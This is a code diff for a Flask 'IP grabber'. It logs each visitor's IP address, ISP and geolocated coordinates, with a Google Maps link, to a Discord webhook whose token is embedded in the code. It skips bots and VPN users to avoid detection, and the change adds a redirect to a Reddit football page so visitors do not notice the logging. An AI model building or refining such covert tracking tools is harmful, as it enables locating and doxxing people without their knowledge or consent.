@@ -1,12 +1,12 @@
-from flask import Flask, request, abort
+from flask import Flask, request, redirect, abort
 import requests
 from datetime import datetime
 
 app = Flask(__name__)
 
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
+REDIRECT_URL = "https://www.reddit.com/r/footballhighlights/"
 
-# Known bot keywords in User-Agent
 BOT_KEYWORDS = [
     "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider",
     "YandexBot", "Sogou", "Exabot", "facebot", "facebookexternalhit",
@@ -14,26 +14,28 @@ BOT_KEYWORDS = [
 ]
 
 def get_client_ip():
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    if ip and "," in ip:
-        ip = ip.split(",")[0].strip()
-    return ip
+    headers = ["X-Forwarded-For", "X-Real-IP"]
+    for h in headers:
+        ip = request.headers.get(h)
+        if ip:
+            if "," in ip:
+                ip = ip.split(",")[0].strip()
+            return ip
+    return request.remote_addr
 
-def is_bot_or_vpn(data, user_agent):
+def is_bot_or_vpn(info, user_agent):
     ua = user_agent.lower()
     for keyword in BOT_KEYWORDS:
         if keyword.lower() in ua:
             return True
-    # Block VPN / proxy / hosting providers
-    security = data.get("security", {})
+    security = info.get("security", {})
     if security.get("vpn") or security.get("proxy") or security.get("hosting"):
         return True
     return False
 
 def get_ip_info(ip):
     try:
-        url = f"https://ipapi.co/{ip}/json/"
-        resp = requests.get(url, timeout=5)
+        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
         return resp.json()
     except:
         return {}
@@ -43,7 +45,6 @@ def index():
     ip = get_client_ip()
     user_agent = request.headers.get("User-Agent", "Unknown")
 
-    # Get location info from ipapi.co
     info = get_ip_info(ip)
 
     if is_bot_or_vpn(info, user_agent):
@@ -56,12 +57,10 @@ def index():
     isp = info.get("org", "Unknown")
     lat = info.get("latitude", 0)
     lon = info.get("longitude", 0)
-
     google_maps_link = f"https://www.google.com/maps?q={lat},{lon}"
 
     now = datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S GMT")
 
-    # Discord message
     message = {
         "content": (
             f"🚶 **New Visitor Detected**\n"
@@ -81,7 +80,8 @@ def index():
     except Exception as e:
         print(f"[ERROR] Webhook failed: {e}")
 
-    return "✅ Visitor Logged", 200
+    # Redirect real visitors to your Reddit page
+    return redirect(REDIRECT_URL, code=302)
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000)
